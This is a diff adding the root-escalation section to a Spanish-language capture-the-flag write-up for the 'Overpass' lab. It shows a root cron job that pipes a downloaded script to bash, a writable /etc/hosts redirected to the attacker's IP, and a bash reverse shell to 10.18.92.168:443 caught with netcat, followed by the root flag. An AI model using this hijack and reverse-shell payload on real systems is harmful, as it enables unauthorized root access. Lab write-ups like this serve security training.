@@ -123,4 +123,29 @@ thm{65c1aaf000506e56996822c6281e6bf7}
 [+]root[+]
 linpeas.sh
 
+[+]cronjob ejecutándose cada minuto. Eso es descargar el script bash de overpass.thm/downloads/src/buildscript.sh y canalizarlo a bash. Eso ejecuta el script como root.
+Y al ir al archivo /etc/hosts , verá que puede escribir en ese archivo.
+
+ames@overpass-prod:/$ cat /etc/crontab 
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+ames@overpass-prod:/$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 overpass-prod
+10.18.92.168 overpass.thm >> tun0 IP
+
+root@x]─[/home/x/Desktop/Thm/overpass]
+└──╼ #mkdir -p downloads/src/
+nano buildscript.sh
+cat buildscript.sh 
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.18.92.168/443 0>&1';
+
+
+sudo nc -lvnp 443
+root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+
+
+
 
